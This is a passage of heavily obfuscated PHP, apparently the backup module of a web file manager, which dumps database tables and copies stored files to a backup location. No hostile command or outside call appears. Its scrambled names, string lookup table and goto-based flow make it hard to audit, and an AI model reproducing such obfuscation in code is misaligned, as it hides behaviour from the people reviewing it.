$·ÜÛÔ[512] => $Ò¿Š“©˜[$·ÜÛÔ[231]], $·ÜÛÔ[1969] => $·ÜÛÔ[12])); } return $this->eventListParse($í÷¦ÖÜÑ, $Âş”Ş¿È); } private function eventListParse($‡ìºñêØ, $«•ÌÖ—Ä) { $àÛ‰Ô‡Å =& $_SERVER[µÅ˜º…æ]; $â£şüŠò = $‡ìºñêØ[$àÛ‰Ô‡Å[446]]; $äé®ª‘Ú = array_to_keyvalue($â£şüŠò, $àÛ‰Ô‡Å[12], $àÛ‰Ô‡Å[191]); $Ï‚á¯¤¬ = array_to_keyvalue($â£şüŠò, $àÛ‰Ô‡Å[12], $àÛ‰Ô‡Å[2417]); foreach ($â£şüŠò as $÷ÚÌÌÁ) { $Õä¨ôœ = $÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]]; if ($÷ÚÌÌÁ[$àÛ‰Ô‡Å[33]] == $àÛ‰Ô‡Å[643] && isset($Õä¨ôœ[$àÛ‰Ô‡Å[1347]])) { $äé®ª‘Ú[] = $Õä¨ôœ[$àÛ‰Ô‡Å[1347]] . $àÛ‰Ô‡Å[12]; $äé®ª‘Ú[] = $Õä¨ôœ[$àÛ‰Ô‡Å[1348]] . $àÛ‰Ô‡Å[12]; } if ($÷ÚÌÌÁ[$àÛ‰Ô‡Å[33]] == $àÛ‰Ô‡Å[2427] && isset($Õä¨ôœ[$àÛ‰Ô‡Å[191]])) { $äé®ª‘Ú[] = $Õä¨ôœ[$àÛ‰Ô‡Å[191]] . $àÛ‰Ô‡Å[12]; } } $äé®ª‘Ú = array_merge($äé®ª‘Ú, $Ï‚á¯¤¬, array($«•ÌÖ—Ä . $àÛ‰Ô‡Å[12])); $äé®ª‘Ú = array_unique($äé®ª‘Ú); $å„«Á¿º = array_unique(array_to_keyvalue($â£şüŠò, $àÛ‰Ô‡Å[12], $àÛ‰Ô‡Å[1593])); $ÆÀì“³ = Model($àÛ‰Ô‡Å[617])->userListInfo($å„«Á¿º); $å®Ü·¾’ = Model($àÛ‰Ô‡Å[932])->sourceListInfo($äé®ª‘Ú, !0); foreach ($â£şüŠò as &$÷ÚÌÌÁ) { if ($÷ÚÌÌÁ[$àÛ‰Ô‡Å[33]] == $àÛ‰Ô‡Å[643] && isset($÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]][$àÛ‰Ô‡Å[1347]])) { $÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]][$àÛ‰Ô‡Å[1347]] = $å®Ü·¾’[$÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]][$àÛ‰Ô‡Å[1347]]]; $÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]][$àÛ‰Ô‡Å[1348]] = $å®Ü·¾’[$÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]][$àÛ‰Ô‡Å[1348]]]; } if ($÷ÚÌÌÁ[$àÛ‰Ô‡Å[33]] == $àÛ‰Ô‡Å[2427] && isset($÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]][$àÛ‰Ô‡Å[191]])) { $÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]][$àÛ‰Ô‡Å[191]] = $å®Ü·¾’[$÷ÚÌÌÁ[$àÛ‰Ô‡Å[540]][$àÛ‰Ô‡Å[191]]]; } $÷ÚÌÌÁ[$àÛ‰Ô‡Å[90]] = $å®Ü·¾’[$÷ÚÌÌÁ[$àÛ‰Ô‡Å[191]]]; $÷ÚÌÌÁ[$àÛ‰Ô‡Å[2433]] = $å®Ü·¾’[$÷ÚÌÌÁ[$àÛ‰Ô‡Å[2417]]]; if ($÷ÚÌÌÁ[$àÛ‰Ô‡Å[33]] == $àÛ‰Ô‡Å[1335]) { $÷ÚÌÌÁ[$àÛ‰Ô‡Å[2433]] = $÷ÚÌÌÁ[$àÛ‰Ô‡Å[90]]; $÷ÚÌÌÁ[$àÛ‰Ô‡Å[2417]] = $÷ÚÌÌÁ[$àÛ‰Ô‡Å[2433]][$àÛ‰Ô‡Å[191]]; $÷ÚÌÌÁ[$àÛ‰Ô‡Å[90]] = !1; $÷ÚÌÌÁ[$àÛ‰Ô‡Å[191]] = $àÛ‰Ô‡Å[12]; } $÷ÚÌÌÁ[$àÛ‰Ô‡Å[2356]] = $ÆÀì“³[$÷ÚÌÌÁ[$àÛ‰Ô‡Å[1593]]]; } unset($÷ÚÌÌÁ); $‡ìºñêØ[$àÛ‰Ô‡Å[446]] = $â£şüŠò; return $‡ìºñêØ; } public function removeBySource($ÃŒÒ’´) { $×Õˆû²Ÿ = array($_SERVER[µÅ˜º…æ][506] => $ÃŒÒ’´); $this->where($×Õˆû²Ÿ)->remove(); } } goto Aœˆ“•Ã´; DšóÃ‹ Ö: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $½¨¦Á™· =& $_SERVER[µÅ˜º…æ]; $ßïº£Œ = Backup::get(); self::$io = $ßïº£Œ[$½¨¦Á™·[851]]; self::$name = $ßïº£Œ[$½¨¦Á™·[32]]; $€È—–” = new DbManage(); $ÖÈ¥ÂÎ = $€È—–”->dbType(); $ØÂÓ›â¨ = array($½¨¦Á™·[879] => $ÖÈ¥ÂÎ, $½¨¦Á™·[880] => time()); Backup::set($ØÂÓ›â¨); $Óæåñã“ = $this->tmpFilesPath() . $½¨¦Á™·[881] . self::$name . $½¨¦Á™·[8]; del_dir($Óæåñã“); mk_dir($Óæåñã“); $ì¾ŒÒŠ = $Óù«½şø = 0; try { $—¢·í€ = $€È—–”->db()->getTables(); } catch (Exception $µşíïÕ÷) { Backup::log($½¨¦Á™·[882] . $µşíïÕ÷->getMessage()); return !1; } $—¢·í€ = array_diff($—¢·í€, array($½¨¦Á™·[883], $½¨¦Á™·[884])); foreach ($—¢·í€ as $™‰¢¸Ÿò) { if ($™‰¢¸Ÿò == $½¨¦Á™·[472]) { continue; } $ì¾ŒÒŠ += $€È—–”->model($™‰¢¸Ÿò)->count(); } $»Şùéš” = new Task($½¨¦Á™·[885], $½¨¦Á™·[878], $ì¾ŒÒŠ, LNG($½¨¦Á™·[886]) . $½¨¦Á™·[887] . LNG($½¨¦Á™·[888])); $GLOBALS[$½¨¦Á™·[889]] = self::$name; foreach ($—¢·í€ as $™‰¢¸Ÿò) { $…ñõÓ˜ƒ = $Óæåñã“ . $™‰¢¸Ÿò . $½¨¦Á™·[890]; if ($™‰¢¸Ÿò == $½¨¦Á™·[472]) { @touch($…ñõÓ˜ƒ); continue; } $Óù«½şø += $€È—–”->sqlFromDb($™‰¢¸Ÿò, $…ñõÓ˜ƒ, $»Şùéš”); } unset($GLOBALS[$½¨¦Á™·[889]]); $»Şùéš”->end(); if ($Óù«½şø > $ì¾ŒÒŠ) { $ì¾ŒÒŠ = $Óù«½şø; } $ØÂÓ›â¨ = array($½¨¦Á™·[879] => $ÖÈ¥ÂÎ, $½¨¦Á™·[875] => 1, $½¨¦Á™·[891] => $ì¾ŒÒŠ, $½¨¦Á™·[892] => $Óù«½şø, $½¨¦Á™·[893] => time()); Backup::set($ØÂÓ›â¨); if (!$ì¾ŒÒŠ || abs($ì¾ŒÒŠ - $Óù«½şø) / $ì¾ŒÒŠ > 0.01) { $‚ÏôçÉ— = $½¨¦Á™·[894]; if (!stristr(I18n::getType(), $½¨¦Á™·[895])) { $‚ÏôçÉ— = $½¨¦Á™·[896]; } Backup::log(array($‚ÏôçÉ—, $ØÂÓ›â¨)); return !1; } return !0; } private function tmpFilesPath() { $í‘ÜÎ£Ï =& $_SERVER[µÅ˜º…æ]; $¢ø¨¯ = TEMP_FILES; if ($GLOBALS[$í‘ÜÎ£Ï[6]][$í‘ÜÎ£Ï[92]][$í‘ÜÎ£Ï[897]]) { $¢ø¨¯ = $GLOBALS[$í‘ÜÎ£Ï[6]][$í‘ÜÎ£Ï[92]][$í‘ÜÎ£Ï[897]]; if (!mk_dir($¢ø¨¯) || !is_writable($¢ø¨¯) || !IO::mkfile($¢ø¨¯ . $í‘ÜÎ£Ï[898])) { $¢ø¨¯ = TEMP_FILES; } } return $¢ø¨¯; } } class BackupDbFile { public function __construct() { } public function index() { $ÒÊç€‚Ø =& $_SERVER[µÅ˜º…æ]; $œŸ˜²…É = Backup::get(); $§Ù«åäş = $œŸ˜²…É[$ÒÊç€‚Ø[32]]; $¸§´Ä‚ = $this->tmpFilesPath() . "\142\x61\x63\x6b\165\x70\x5f{$§Ù«åäş}\57"; $¯êĞ»Üß = $this->backupPath($œŸ˜²…É); if (!($¯êĞ»Üß = IO::mkdir($¯êĞ»Üß))) { Backup::log($ÒÊç€‚Ø[899] . $¯êĞ»Üß); return !1; } $½úŠ¿ÜÆ = new DbManage(); $Äô¿ƒÂ = $½úŠ¿ÜÆ->getSqlFile(); if (!$Äô¿ƒÂ || !$Äô¿ƒÂ[$ÒÊç€‚Ø[900]] || !$Äô¿ƒÂ[$ÒÊç€‚Ø[13]]) { Backup::log($ÒÊç€‚Ø[901]); return !1; } IO::move($Äô¿ƒÂ[$ÒÊç€‚Ø[900]], $¸§´Ä‚); IO::move($Äô¿ƒÂ[$ÒÊç€‚Ø[13]], $¸§´Ä‚); $½úŠ¿ÜÆ->mixBakList($¸§´Ä‚); $ÊÎÓçâ = IO::listPath($¸§´Ä‚); $Òø·ÙÉ› = isset($ÊÎÓçâ[$ÒÊç€‚Ø[86]]) ? $ÊÎÓçâ[$ÒÊç€‚Ø[86]] : array(); $˜úà¹³Õ = array_sum(array_column($Òø·ÙÉ›, $ÒÊç€‚Ø[79])); if (!$˜úà¹³Õ) { Backup::log($ÒÊç€‚Ø[902] . $¸§´Ä‚); return !1; } $àúşÔ’¶ = array($ÒÊç€‚Ø[903] => $˜úà¹³Õ, $ÒÊç€‚Ø[904] => time()); Backup::set($àúşÔ’¶); Hook::trigger($ÒÊç€‚Ø[905], $¸§´Ä‚, $¯êĞ»Üß); $¸½óüØ¼ = new TaskFileTransfer($ÒÊç€‚Ø[905], $ÒÊç€‚Ø[878], count($Òø·ÙÉ›), LNG($ÒÊç€‚Ø[886]) . $ÒÊç€‚Ø[476] . LNG($ÒÊç€‚Ø[888]) . $ÒÊç€‚Ø[906]); $¸½óüØ¼->task[$ÒÊç€‚Ø[863]] = $˜úà¹³Õ; foreach ($ÊÎÓçâ[$ÒÊç€‚Ø[86]] as $ÍíÌ¹î») { $ã…ßêçß = IO::move($ÍíÌ¹î»[$ÒÊç€‚Ø[87]], $¯êĞ»Üß); if (!$ã…ßêçß) { $¸½óüØ¼->end(); $†¢–£İ‚ = IO::getLastError($ÒÊç€‚Ø[907] . $ÍíÌ¹î»[$ÒÊç€‚Ø[87]] . $ÒÊç€‚Ø[908] . $¯êĞ»Üß . $ÒÊç€‚Ø[175]); Backup::log($†¢–£İ‚); return !1; } } $¸½óüØ¼->end(); $àúşÔ’¶ = array($ÒÊç€‚Ø[909] => $˜úà¹³Õ, $ÒÊç€‚Ø[910] => time()); Backup::set($àúşÔ’¶); return !0; } private function backupPath($çŞ‹àô²) { $Ò—çØÖ =& $_SERVER[µÅ˜º…æ]; $­ÚÄöëÛ = $çŞ‹àô²[$Ò—çØÖ[32]]; $È˜–¤“Æ = Model($Ò—çØÖ[872])->get($Ò—çØÖ[873]); $ÕÆ˜ïÒº = substr(md5($Ò—çØÖ[874] . $È˜–¤“Æ . $­ÚÄöëÛ), 0, 8); return "\173\x69\157\x3a{$çŞ‹àô²[$Ò—çØÖ[851]]}\x7d\x2f\144\x61\x74\141\142\x61\163\x65\57\x62\141\143\x6b\165\x70\x2f" . $­ÚÄöëÛ . $Ò—çØÖ[11] . $ÕÆ˜ïÒº; } private function tmpFilesPath() { $ï‚š«ßÃ =& $_SERVER[µÅ˜º…æ]; $Ü–¢µù‡ = TEMP_FILES; if ($GLOBALS[$ï‚š«ßÃ[6]][$ï‚š«ßÃ[92]][$ï‚š«ßÃ[897]]) { $Ü–¢µù‡ = $GLOBALS[$ï‚š«ßÃ[6]][$ï‚š«ßÃ[92]][$ï‚š«ßÃ[897]]; if (!mk_dir($Ü–¢µù‡) || !is_writable($Ü–¢µù‡) || !IO::mkfile($Ü–¢µù‡ . $ï‚š«ßÃ[898])) { $Ü–¢µù‡ = TEMP_FILES; } } return $Ü–¢µù‡; } } class BackupFile { protected $bakVer = "\x6f\154\144"; public function __construct($âÉ±‚úÎ = false) { $Î±‡Æ§à =& $_SERVER[µÅ˜º…æ]; $this->bakVer = $âÉ±‚úÎ ? $Î±‡Æ§à[911] : $Î±‡Æ§à[912]; } public function index() { $ğ«ë‰²® = Backup::get(); $´šÕÌÈ° = $ğ«ë‰²®[$_SERVER[µÅ˜º…æ][855]][$_SERVER[µÅ˜º…æ][230]][$_SERVER[µÅ˜º…æ][557]]; $©ªÀ±ñ˜ = array($_SERVER[µÅ˜º…æ][558] => array($_SERVER[µÅ˜º…æ][913], $´šÕÌÈ°), $_SERVER[µÅ˜º…æ][914] => array($_SERVER[µÅ˜º…æ][406], $ğ«ë‰²®[$_SERVER[µÅ˜º…æ][851]])); $ùşş™éÇ = (int) Model($_SERVER[µÅ˜º…æ][915])->where($©ªÀ±ñ˜)->count($_SERVER[µÅ˜º…æ][557]); $„öÄ£®ß = (int) Model($_SERVER[µÅ˜º…æ][915])->where($©ªÀ±ñ˜)->sum($_SERVER[µÅ˜º…æ][79]); $†úŸî»ª = new TaskFileTransfer($_SERVER[µÅ˜º…æ][916], $_SERVER[µÅ˜º…æ][878], $ùşş™éÇ, LNG($_SERVER[µÅ˜º…æ][886]) . $_SERVER[µÅ˜º…æ][887] . LNG($_SERVER[µÅ˜º…æ][917])); $†úŸî»ª->task[$_SERVER[µÅ˜º…æ][863]] = $„öÄ£®ß; $Ş­‚÷çş = array($_SERVER[µÅ˜º…æ][918] => $ùşş™éÇ, $_SERVER[µÅ˜º…æ][919] => $„öÄ£®ß, $_SERVER[µÅ˜º…æ][920] => time()); Backup::set($Ş­‚÷çş); $–Ì‚¹­à = !0; $îÍğøì¥ = $this->storeIds(); $Ç½—³ßî = 1; $¼Û¢æ ü = 1000; $¾ÌÕÙÆ = $­»ÍÀ™ò = 0; $â®úùˆ¾ = array(); $»Û•¨õ = $ò¡›¸¬ = 0; do { $¶Ÿ£Ù¥ú = $_SERVER[µÅ˜º…æ][921]; $Ã“³Ãı = Model($_SERVER[µÅ˜º…æ][915])->where($©ªÀ±ñ˜)->field($¶Ÿ£Ù¥ú)->order($_SERVER[µÅ˜º…æ][922])->selectPage($¼Û¢æ ü, $Ç½—³ßî); $˜Ù»ã¤ê = !empty($Ã“³Ãı[$_SERVER[µÅ˜º…æ][446]]) ? $Ã“³Ãı[$_SERVER[µÅ˜º…æ][446]] : array(); foreach ($˜Ù»ã¤ê as $äÅÎ•À‚) { if (!$this->_fileExist($äÅÎ•À‚, $â®úùˆ¾, $îÍğøì¥)) { Backup::log($_SERVER[µÅ˜º…æ][923] . $äÅÎ•À‚[$_SERVER[µÅ˜º…æ][557]] . $_SERVER[µÅ˜º…æ][924] . $äÅÎ•À‚[$_SERVER[µÅ˜º…æ][87]]); continue; } $‘¤‡êß = $äÅÎ•À‚[$_SERVER[µÅ˜º…æ][87]]; $üÕ½´‘ = "\173\x69\x6f\72{$ğ«ë‰²®[$_SERVER[µÅ˜º…æ][851]]}\175" . substr($‘¤‡êß, strlen("\x7b\151\157\72{$äÅÎ•À‚[$_SERVER[µÅ˜º…æ][925]]}\175")); if (IO::exist($üÕ½´‘)) { $†úŸî»ª->updateFileEnd($äÅÎ•À‚[$_SERVER[µÅ˜º…æ][32]], $äÅÎ•À‚[$_SERVER[µÅ˜º…æ][79]]); } else { $üÕ½´‘ = get_path_father($üÕ½´‘); IO::mkdir($üÕ½´‘); if (!IO::copy($‘¤‡êß, $üÕ½´‘, $_SERVER[µÅ˜º…æ][926])) { Backup::log($_SERVER[µÅ˜º…æ][927] . $‘¤‡êß . $_SERVER[µÅ˜º…æ][908] . $üÕ½´‘ . $_SERVER[µÅ˜º…æ][175]); $–Ì‚¹­à = !1; break; } } $´šÕÌÈ° = $äÅÎ•À‚[$_SERVER[µÅ˜º…æ][557]]; $­»ÍÀ™ò += 1; $¾ÌÕÙÆ += $äÅÎ•À‚[$_SERVER[µÅ˜º…æ][79]]; $ò¡›¸¬ += 1; $»Û•¨õ += $äÅÎ•À‚[$_SERVER[µÅ˜º…æ][79]]; if ($¾ÌÕÙÆ >= 1024 * 1024 * 100) { $Ş­‚÷çş = array($_SERVER[µÅ˜º…æ][850] => $´šÕÌÈ°, $_SERVER[µÅ˜º…æ][928] => $ò¡›¸¬, $_SERVER[µÅ˜º…æ][929] => $»Û•¨õ); Backup::set($Ş­‚÷çş); $¾ÌÕÙÆ = $­»ÍÀ™ò = 0; } } $ÛËªæÑ³ = count($˜Ù»ã¤ê); $Ç½—³ßî++; } while ($ÛËªæÑ³ == $¼Û¢æ ü); $†úŸî»ª->end(); $Ş­‚÷çş = array($_SERVER[µÅ˜º…æ][930] => 1, $_SERVER[µÅ˜º…æ][861] => time(), $_SERVER[µÅ˜º…æ][877] => 1, $_SERVER[µÅ˜º…æ][850] => $´šÕÌÈ°, $_SERVER[µÅ˜º…æ][931] => time()); if ($­»ÍÀ™ò) { $Ş­‚÷çş[$_SERVER[µÅ˜º…æ][928]] = $ò¡›¸¬; $Ş­‚÷çş[$_SERVER[µÅ˜º…æ][929]] = $»Û•¨õ; } Backup::set($Ş­‚÷çş); return !0; } private function _fileExist($ò”†ù„, &$ÙàŸùˆ¤, $ªÈíÂ Ì) { $ˆ– Å =& $_SERVER[µÅ˜º…æ]; $´İ•Òëı = $ò”†ù„[$ˆ– Å[87]]; if (in_array($ò”†ù„[$ˆ– Å[557]], $ÙàŸùˆ¤)) { return !1; } if (!in_array($ò”†ù„[$ˆ– Å[925]], $ªÈíÂ Ì)) { return !1; } if (IO::exist($´İ•Òëı)) { return !0; } $½íè‡¼÷ = get_path_father($´İ•Òëı); if (IO::exist($½íè‡¼÷)) { $ÙàŸùˆ¤[] = $ò”†ù„[$ˆ– Å[557]]; return !1; } $¦ÛàèˆØ = array($ˆ– Å[925] => $ò”†ù„[$ˆ– Å[925]], $ˆ– Å[87] => array($ˆ– Å[473], "{$½íè‡¼÷}\45")); $€áîåõõ = Model($ˆ– Å[915])->where($¦ÛàèˆØ)->field($ˆ– Å[558])->select(); $ÙàŸùˆ¤ = array_merge($ÙàŸùˆ¤, array_to_keyvalue($€áîåõõ, $ˆ– Å[12], $ˆ– Å[557])); return !1; } private function _fileFilter($Û­ ¦) { $¶’ÔÜ–Ó =& $_SERVER[µÅ˜º…æ]; return; if (empty($Û­ ¦)) { return; } $òî«ßµ¥ = array($¶’ÔÜ–Ó[557] => array($¶’ÔÜ–Ó[7], array_unique($Û­ ¦))); $Ğïóäğ® = Model($¶’ÔÜ–Ó[932])->where($òî«ßµ¥)->field($¶’ÔÜ–Ó[191])->select(); foreach ($Ğïóäğ® as $“•¸ô­­) { Model($¶’ÔÜ–Ó[932])->remove($“•¸ô­­[$¶’ÔÜ–Ó[191]], !1); } } private function storeIds() { $¼ôµ¯íÓ =& $_SERVER[µÅ˜º…æ]; $Œ…×äøğ = Model($¼ôµ¯íÓ[867])->listData(); $î¢ŒÔ§× = array(); $ÃæÍøÇ = $GLOBALS[$¼ôµ¯íÓ[6]][$¼ôµ¯íÓ[92]][$¼ôµ¯íÓ[933]]; foreach ($Œ…×äøğ as $—ıÑ×ğ) { $½’åìâï = strtolower($—ıÑ×ğ[$¼ôµ¯íÓ[96]]); if (!isset($ÃæÍøÇ[$½’åìâï])) { continue; } $™ô»ÅğÏ = $¼ôµ¯íÓ[77] . (isset($ÃæÍøÇ[$½’åìâï]) ? $ÃæÍøÇ[$½’åìâï] : ucfirst($½’åìâï)); if (!class_exists($™ô»ÅğÏ)) { continue; } $î¢ŒÔ§×[] = $—ıÑ×ğ[$¼ôµ¯íÓ[487]]; } return $î¢ŒÔ§×; } public function start($›éÂö·, $™ŠûÚ¡ª) { $à±ş‹ã =& $_SERVER[µÅ˜º…æ]; $ŠÑƒÔüó = KodIO::makePath(KodIO::KOD_IO, $›éÂö·); if (!$this->checkStore($›éÂö·)) { write_log($à±ş‹ã[934] . $ŠÑƒÔüó, $à±ş‹ã[935]); return; } $¿²ª…ìÓ = KodIO::defaultDriver(); if ($¿²ª…ìÓ[$à±ş‹ã[487]] == $›éÂö·) { write_log($à±ş‹ã[936] . $ŠÑƒÔüó, $à±ş‹ã[935]); return; } $ŠÑ¶ë®† = $à±ş‹ã[937]; $î´«´İå = Task::get($ŠÑ¶ë®†); if ($î´«´İå) { if ($î´«´İå[$à±ş‹ã[849]] == $à±ş‹ã[938]) { return; } Task::kill($ŠÑ¶ë®†); } $¿¡©Â³ = array($à±ş‹ã[851] => $›éÂö·, $à±ş‹ã[557] => 0, $à±ş‹ã[204] => 0, $à±ş‹ã[855] => array($à±ş‹ã[858] => 0, $à±ş‹ã[939] => 0, $à±ş‹ã[863] => 0, $à±ş‹ã[940] => 0, $à±ş‹ã[941] => 0)); $¸ Âîû¥ = Model($à±ş‹ã[872])->get($à±ş‹ã[942], $à±ş‹ã[878]); $¸ Âîû¥ = json_decode($¸ Âîû¥, !0); if (!$¸ Âîû¥) { $¸ Âîû¥ = array(); } if ($¸ Âîû¥[$à±ş‹ã[851]] && $¸ Âîû¥[$à±ş‹ã[851]] != $›éÂö·) { $¸ Âîû¥[$à±ş‹ã[557]] = 0; $¸ Âîû¥[$à±ş‹ã[851]] = $›éÂö·; } $¸ Âîû¥ = array_merge($¿¡©Â³, $¸ Âîû¥); $–€Ë´­¡ = _get($GLOBALS, $à±ş‹ã[7], array()); if ($–€Ë´­¡[$à±ş‹ã[854]] == $à±ş‹ã[91] && $–€Ë´­¡[$à±ş‹ã[943]] == $à±ş‹ã[91] || !$¸ Âîû¥[$à±ş‹ã[557]]) { $¸ Âîû¥ = $¿¡©Â³; } $ŠÑƒÔüó = KodIO::makePath(KodIO::KOD_IO, $¸ Âîû¥[$à±ş‹ã[851]]); $Ïê·¾ö· = $ŠÑƒÔüó . $à±ş‹ã[944]; if (!file_exists($Ïê·¾ö·)) { $¢–ô¸æË = file_get_contents(__DIR__ . $à±ş‹ã[945]); if (defined($à±ş‹ã[946]) && INSTALL_CHANNEL) { $¢–ô¸æË = str_replace($à±ş‹ã[947], INSTALL_CHANNEL, $¢–ô¸æË); } file_put_contents($Ïê·¾ö·, $¢–ô¸æË); } $£ŒÚ¨û = $™ŠûÚ¡ª * 60 * 0.8; $¶òü•ğ¬ = timeFloat(); $¡…ú–îÁ = Model($à±ş‹ã[560]); $öô­šáç = array($à±ş‹ã[558] => array($à±ş‹ã[913], $¸ Âîû¥[$à±ş‹ã[557]])); $­µ¨öğŸ = $¡…ú–îÁ->field(array($à±ş‹ã[948] => $à±ş‹ã[949], $à±ş‹ã[950] => $à±ş‹ã[79]))->where($öô­šáç)->find(); if (!$­µ¨öğŸ[$à±ş‹ã[949]]) { return; } $Æ«üè = intval($­µ¨öğŸ[$à±ş‹ã[949]]); $åƒ¦´¨± = intval($­µ¨öğŸ[$à±ş‹ã[79]]); $¸ Âîû¥[$à±ş‹ã[855]][$à±ş‹ã[858]] += $Æ«üè; $¸ Âîû¥[$à±ş‹ã[855]][$à±ş‹ã[863]] += $åƒ¦´¨±; $¸ Âîû¥[$à±ş‹ã[204]] = time(); Model($à±ş‹ã[872])->set($à±ş‹ã[942], $¸ Âîû¥, $à±ş‹ã[878]); $î´«´İå = new TaskFileTransfer($ŠÑ¶ë®†, $à±ş‹ã[878], $Æ«üè, LNG($à±ş‹ã[886]) . $à±ş‹ã[887] . LNG($à±ş‹ã[917])); $î´«´İå->task[$à±ş‹ã[863]] = $åƒ¦´¨±; $»¯ó“Ø = 500; $¢ËŒÑ³Ù = 1; $ÇŞ¨Ôç = $à±ş‹ã[921]; $Ê¼Ñá…ñ = $¡…ú–îÁ->where($öô­šáç)->field($ÇŞ¨Ôç)->order($à±ş‹ã[922])->selectPage($»¯ó“Ø, $¢ËŒÑ³Ù); $ôµ™Ò´ = array($à±ş‹ã[858] => 0, $à±ş‹ã[951] => 0, $à±ş‹ã[941] => 0, $à±ş‹ã[952] => $¸ Âîû¥[$à±ş‹ã[557]], $à±ş‹ã[953] => 0); $µºËºˆã = intval($Ê¼Ñá…ñ[$à±ş‹ã[443]][$à±ş‹ã[445]]); while ($Ê¼Ñá…ñ && $¢ËŒÑ³Ù <= $µºËºˆã) { if (timeFloat() - $¶òü•ğ¬ > $£ŒÚ¨û) { break; } foreach ($Ê¼Ñá…ñ[$à±ş‹ã[446]] as $¾üà±‰ß) { if (timeFloat() - $¶òü•ğ¬ > $£ŒÚ¨û) { break; } $ôµ™Ò´[$à±ş‹ã[858]]++; $ôµ™Ò´[$à±ş‹ã[953]] = $¾üà±‰ß[$à±ş‹ã[557]]; $¸ Âîû¥[$à±ş‹ã[557]] = $¾üà±‰ß[$à±ş‹ã[557]]; $¸ Âîû¥[$à±ş‹ã[855]][$à±ş‹ã[939]]++; $¸ Âîû¥[$à±ş‹ã[855]][$à±ş‹ã[940]] += $¾üà±‰ß[$à±ş‹ã[79]]; $§’‘õ–Í = $¾üà±‰ß[$à±ş‹ã[87]]; if (!$this->isFileExist($¾üà±‰ß, $¡…ú–îÁ)) { $î´«´İå->updateFileEnd($¾üà±‰ß[$à±ş‹ã[32]], $¾üà±‰ß[$à±ş‹ã[79]]); $¸ Âîû¥[$à±ş‹ã[855]][$à±ş‹ã[941]]++; $ôµ™Ò´[$à±ş‹ã[951]]++; write_log($à±ş‹ã[923] . $¾üà±‰ß[$à±ş‹ã[557]] . $à±ş‹ã[924] . $§’‘õ–Í, $à±ş‹ã[935]); continue; } $®§’Ãû = $ŠÑƒÔüó . substr($§’‘õ–Í, strlen("\173\151\x6f\72{$¾üà±‰ß[$à±ş‹ã[925]]}\x7d\57")); if (IO::exist($®§’Ãû)) { $î´«´İå->updateFileEnd($¾üà±‰ß[$à±ş‹ã[32]], $¾üà±‰ß[$à±ş‹ã[79]]); continue; } $®§’Ãû = get_path_father($®§’Ãû); if (!IO::copy($§’‘õ–Í, $®§’Ãû, REPEAT_SKIP)) { $¸ Âîû¥[$à±ş‹ã[855]][$à±ş‹ã[941]]++; $ôµ™Ò´[$à±ş‹ã[941]]++; write_log($à±ş‹ã[954] . $¾üà±‰ß[$à±ş‹ã[557]] . $à±ş‹ã[924] . $§’‘õ–Í, $à±ş‹ã[935]); } $î´«´İå->updateFileEnd($¾üà±‰ß[$à±ş‹ã[32]], $¾üà±‰ß[$à±ş‹ã[79]]); } Model($à±ş‹ã[872])->set($à±ş‹ã[942], $¸ Âîû¥, $à±ş‹ã[878]); $¢ËŒÑ³Ù++; $Ê¼Ñá…ñ = $¡…ú–îÁ->where($öô­šáç)->field($ÇŞ¨Ôç)->order($à±ş‹ã[922])->selectPage($»¯ó“Ø, $¢ËŒÑ³Ù); } $î´«´İå->end(); write_log($à±ş‹ã[955] . json_encode($ôµ™Ò´), $à±ş‹ã[935]); if (IO::mkdir($ŠÑƒÔüó . $à±ş‹ã[956])) { $ôµ™Ò´[$à±ş‹ã[953]] = $¸ Âîû¥[$à±ş‹ã[557]]; IO::setContent($ŠÑƒÔüó . $à±ş‹ã[957] . date($à±ş‹ã[958]) . $à±ş‹ã[959], json_encode($ôµ™Ò´)); } Model($à±ş‹ã[872])->set($à±ş‹ã[942], $¸ Âîû¥, $à±ş‹ã[878]); return !0; } private function isFileExist($Ò­½ª¾Ì, $Î›±¾Ğ›) { $ƒ™·Ã€ =& $_SERVER[µÅ˜º…æ]; static $×³“ÉÓ = null; static $¿ÍÛ«« = null; if (is_null($×³“ÉÓ)) { $×³“ÉÓ = $¿ÍÛ«« = array(); } $÷…ƒò§ = $Ò­½ª¾Ì[$ƒ™·Ã€[925]]; $Ô‘à†Ğ” = KodIO::parse($Ò­½ª¾Ì[$ƒ™·Ã€[87]]); if ($÷…ƒò§ != $Ô‘à†Ğ”[$ƒ™·Ã€[487]]) { return !1; } if (!isset($×³“ÉÓ[$÷…ƒò§])) { $×³“ÉÓ[$÷…ƒò§] = $this->checkStore($÷…ƒò§); } if ($×³“ÉÓ[$÷…ƒò§] !== 1) { return !1; } if (in_array($Ò­½ª¾Ì[$ƒ™·Ã€[557]], $¿ÍÛ««)) { return !1; } $œÌ¦Ï¥ = $Ò­½ª¾Ì[$ƒ™·Ã€[87]]; if (IO::exist($œÌ¦Ï¥)) { return !0; } $¹¯æÃÏ¡ = get_path_father($œÌ¦Ï¥); if (IO::exist($¹¯æÃÏ¡)) { $¿ÍÛ««[] = $Ò­½ª¾Ì[$ƒ™·Ã€[557]]; return !1; } $ÖøÈôÒï = array($ƒ™·Ã€[925] => $÷…ƒò§, $ƒ™·Ã€[87] => array($ƒ™·Ã€[473], "{$¹¯æÃÏ¡}\45")); $í²Ü‰½Ã = $Î›±¾Ğ›->where($ÖøÈôÒï)->field($ƒ™·Ã€[558])->select(); $¿ÍÛ«« = array_merge($¿ÍÛ««, array_to_keyvalue($í²Ü‰½Ã, $ƒ™·Ã€[12], $ƒ™·Ã€[557])); return !1; } public function checkStore($…ó €ÑÉ) { static $¢áûÓ¦Í; if (is_null($¢áûÓ¦Í)) { $¢áûÓ¦Í = Model($_SERVER[µÅ˜º…æ][867]); } $Êêª¯Ù… = $¢áûÓ¦Í->listData($…ó €ÑÉ); if (!$Êêª¯Ù…) { return 0; } try { $’»Ã§§² = $¢áûÓ¦Í->checkConfig($Êêª¯Ù…, !0); } catch (Exception $§ïØÀ) { $’»Ã§§² = !1; } return $’»Ã§§² === !0 ? 1 : 0; } } goto Fîğ…êéÌï; dßïƒó®íá: if (!$tweapokcml) { return; } $_SERVER[ş•üòéú] = explode($_SERVER[µÅ˜º…æ][702], 